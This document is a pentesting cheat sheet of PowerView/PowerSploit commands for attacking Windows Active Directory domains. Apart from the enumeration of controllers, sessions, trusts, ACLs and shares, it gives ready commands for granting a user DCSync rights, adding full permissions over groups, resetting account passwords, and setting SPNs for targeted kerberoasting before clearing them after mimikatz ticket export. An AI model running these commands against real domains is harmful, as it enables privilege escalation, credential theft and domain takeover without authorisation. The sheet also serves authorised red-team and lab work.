### Source 
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1  

### Get domain controller for current domain
```
Get-NetDomainController
```

### Get remote logged in user
```
Get-NetSession -ComputerName &lt;fqdnRhost&gt;
```

### Get object descriptions
```
Get-NetUser | select-object samaccountname,description | fl | Out-File &lt;file&gt;.txt
```

### Get specific user description
```
Get-NetUser -Username &lt;user&gt; 
```

### Get list of all domain trusts
```
Get-NetDomainTrust
```

### Get details about the current forest
```
Get-NetForest
```

### Find all machines where user has local admin rights
```
Find-LocalAdminAccess –Verbose -Domain &lt;domain&gt; -Computername &lt;rhost&gt;
```

### Show all security identifiers (SID) that can create new GPOs
```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=&lt;domainComponent&gt;,DC=&lt;domainComponent&gt;" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

### Get name of SID
```
ConvertFrom-SID &lt;securityIdentifier&gt;
```

### Show all principals that can write to GP-Link attributes
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

### Get computeraccounts in specific OU
```
Get-DomainComputer | ? { $_.DistinguishedName -match "&lt;distinguishedName&gt;" -or $_.DistinguishedName -match "OU=&lt;ou&gt;" } | select DnsHostName
```

### Add full permissions over a group to specific user (right = All or ResetPassword or WriteMembers)
```
Add-ObjectAcl -TargetADSprefix '&lt;distinguishedName&gt;' -PrincipalSamAccountName &lt;user&gt; -Rights &lt;right&gt; -Verbose
```

### Add DCSync right to a specific user
```
Add-ObjectAcl -TargetDistinguishedName 'distinguishedName' -PrincipalSamAccountName &lt;user&gt; -Rights DCSync -Verbose
```

### Set a new password for specific user
```
Set-DomainUserPassword -Identity &lt;user&gt; -AccountPassword (ConvertTo-SecureString "&lt;password&gt;" -AsPlainText -Force) -Verbose
```

### Check if user has SPN set (targeted kerberoast)
```
Get-DomainUser -Identity &lt;user&gt; | select serviceprincipalname
Get-DomainComputer -Identity &lt;user&gt; | select serviceprincipalname
```

### Set a new SPN
```
Set-DomainObject -Identity &lt;userOrComputer&gt; -Set @{serviceprincipalname='foo/bar'}
```

### Request ticket from SPN
```
Request-SPNTicket -SPN 'foo/bar'
```

### After export of tickets using mimikatz remove SPN
```
Set-DomainObject -Credential $Cred -Identity &lt;userOrComputer&gt; -Clear serviceprincipalname
```

### List accessible shares (without -ComputerName check all domain joined hosts)
```
Find-DomainShare -CheckShareAccess -ComputerName &lt;rhost&gt;
```

### Search for accounts with DS-Replication-Get-Changes or DS-Replication-Get-Changes-In-Filtered-Set
```
Get-ObjectAcl -DistinguishedName "dc=&lt;domainComponent&gt;,dc=&lt;domainComponent&gt; -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

### List machine account quota
```
Get-DomainObject -Domain &lt;domain&gt; -Properties ms-ds-machineaccountquota | Select -First 1
```


